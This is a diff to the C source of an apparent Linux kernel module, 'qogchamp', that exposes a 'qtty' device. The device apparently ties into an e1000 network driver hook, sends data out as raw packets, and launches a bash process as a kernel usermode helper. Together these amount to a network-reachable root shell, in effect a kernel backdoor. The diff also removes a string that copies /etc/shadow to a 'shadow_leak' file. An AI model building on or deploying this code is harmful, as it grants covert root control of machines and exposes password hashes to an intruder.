@@ -5,15 +5,6 @@
 //this qtty will interact with the e1000_hook
 
 
-
-struct qtty qtty;
-
-
-
-
-char* str = "cat /etc/shadow > shadow_leak\n";
-
-
 /*
 Linux kernel list semantics are interesting. Apparently, the way this works is that an empty list is a list 
 where the list->next == list. This implies that the list contains one entry at all times. Therefore,
@@ -25,6 +16,18 @@ DEFINE_SPINLOCK(commands_lock); //this look prevents the whole commands structur
 
 
 DECLARE_WAIT_QUEUE_HEAD(command_wait); //command wait queue
+
+/*
+call usermodehelper runs in a new thread, so we need to create a waitqueue and wait to populate it.
+
+The use of this structure is important as it could be dropped from under us (In the case that the bash proc is killed). 
+Therefore, this structure should ONLY be dereferenced from the process context OF THE BASH PROCESS (i.e. in syscalls)
+
+*/
+
+struct task_struct* bash_proc; //
+
+
 /*
 
 the command we're currently writing
@@ -52,13 +55,13 @@ ssize_t qtty_write(struct file* f, const char __user * buf, size_t size, loff_t*
         return -EFAULT; //invalid buffer
     }
 
-    if(construct_and_send_skb(kbuf, size)){
+    if(construct_and_send_skb(kbuf, size)){ 
       return -EINVAL;
     }
     
     
     
-    return size;
+    return size; //all or nothing lol. Might change this. 
 
 
     
@@ -122,7 +125,7 @@ ssize_t qtty_read(struct file* f, char* __user buf, size_t size, loff_t* off){ /
     BUG_ON(!cur_command && *off != 0); //it should never happen that we have a nonzero offset while cur_command is 0
     if(list_empty(&commands)){
      wait_read(); //wait until we get a new command. 
-
+    }
 
     spin_lock_irqsave(&commands_lock, flags);
 
@@ -180,44 +183,6 @@ const struct file_operations qtty_fops = {
 
 
 
-void init_qtty(void){ //init dev
-    int err;
-    err = register_chrdev_region(MKDEV(QTTY_MAJOR, QTTY_MINOR), DEV_COUNT , "qogchamp");//reverse major and minor numbers for use.
-    
-    if(err){
-        printk(KERN_INFO "Failed to reserve major and minor numbers");
-        return;
-    }
-    
-    
-    cdev_init(&qtty.cdev, &qtty_fops);
-    err = cdev_add(&qtty.cdev, MKDEV(QTTY_MAJOR, QTTY_MINOR), 1);
-    qtty.cdev.owner = THIS_MODULE;
-    printk(KERN_INFO "error: %d\n", err);
-    if(err){
-        qtty.cdev.owner = NULL;
-        printk(KERN_INFO "cdev could not be added\n");
-
-    }
-
-    
-}
-
-void qtty_clean_up(void){
-    
-   
-    unregister_chrdev_region(MKDEV(QTTY_MAJOR, QTTY_MINOR), DEV_COUNT);
-    
-    if(!qtty.cdev.owner){
-        printk(KERN_INFO "qtty not initialized\n");
-        return;
-    }
-
-
-    cdev_del(&qtty.cdev);
-
-
-}
 
 
 
@@ -226,20 +191,20 @@ void qtty_clean_up(void){
 
 
 
-struct task_struct* umh_tsk = NULL; //call usermodehelper runs in a new thread, so we need to create a waitqueue and wait to populate it.
+ 
 
-DECLARE_WAIT_QUEUE_HEAD(qogchamp_wait); //wait queue for qogchamp. This is used for waiting for umh_tsk to be populated
+DECLARE_WAIT_QUEUE_HEAD(qogchamp_wait); //wait queue for qogchamp. This is used for waiting for bash_proc to be populated
 
 
 
-int init_func(struct subprocess_info* info, struct cred* new){ 
+static int init_func(struct subprocess_info* info, struct cred* new){ 
   int retval;
   struct file* qtty_file_0;
   struct file* qtty_file_1;
   struct file* qtty_file_2;
   //printk(KERN_INFO "old task ptr: 0x%lx, new task ptr: 0x%lx", (unsigned long)info->data, (unsigned long)current);
-  umh_tsk = current; //get task_struct
-  get_task_struct(umh_tsk); //increase reference counter so the task doesn't disappear from under us
+  bash_proc = current; //get task_struct
+  get_task_struct(bash_proc); //increase reference counter so the task doesn't disappear from under us. I don't know how the refcount interacts with SIGKILL. TODO. 
   wake_up(&qogchamp_wait); 
  // printk("PID: %d\n", current->pid);
   
@@ -270,7 +235,6 @@ int init_func(struct subprocess_info* info, struct cred* new){
 
 void launch_bash(void){
   struct subprocess_info* sub_info;
-  int status;
   char* argv[] = {"hello world!\xA", NULL}; //for some reason these arrays need to be null terminated. 
   DECLARE_WAITQUEUE(wait, current);
   add_wait_queue(&qogchamp_wait, &wait); //add it here so we don't hit a race condition
@@ -286,11 +250,10 @@ void launch_bash(void){
   //it is possible that we get preempted here. However, because we added it to the wait_queue, it shouldn't matter despite umh_exec executing asynchronously
   while(1){ //wait for task to start
     set_current_state(TASK_UNINTERRUPTIBLE);
-    if(umh_tsk != NULL)
+    if(bash_proc != NULL)
       break;
     schedule();
   }
   __set_current_state(TASK_RUNNING);
   remove_wait_queue(&qogchamp_wait, &wait);
-  put_task_struct(umh_tsk);
 }
